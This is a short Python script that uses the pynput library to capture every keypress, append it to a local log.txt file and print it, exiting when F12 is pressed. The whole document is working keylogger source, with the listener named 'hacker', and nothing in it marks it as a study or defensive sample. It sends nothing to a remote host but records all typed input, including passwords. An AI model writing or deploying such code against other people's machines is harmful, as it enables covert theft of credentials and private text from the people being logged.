from pynput.keyboard import Listener # type: ignore

def keylogger(key):
    key=str(key)
    if key == "Key.f12":
        raise SystemExit(0)
    with open("log.txt","a") as file:
        file.write(key)
    print(key)

with Listener(on_press=keylogger)as hacker:
    hacker.join()
